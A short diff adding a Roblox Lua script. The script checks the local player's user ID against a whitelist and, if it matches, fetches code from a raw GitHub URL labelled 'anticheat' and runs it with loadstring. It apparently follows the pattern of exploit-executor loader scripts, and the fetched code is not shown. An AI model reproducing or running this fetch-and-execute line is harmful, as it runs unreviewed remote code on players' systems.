@@ -1,0 +1,20 @@
+local WhitelistedUserIds = {
+    ["1539647615"] = true,
+    [""] = true,
+
+}
+
+local Player = game.Players.LocalPlayer
+
+local function isWhitelisted(player)
+    local userId = tostring(player.UserId)
+    return WhitelistedUserIds[userId] == true
+end
+
+if isWhitelisted(Player) then
+   loadstring(game:HttpGet('https://raw.githubusercontent.com/saifsjwwi/club-iris/main/anticheat'))()
+    print("You are whitelisted")
+else
+    print("blud is not whitelisted")
+   
+end
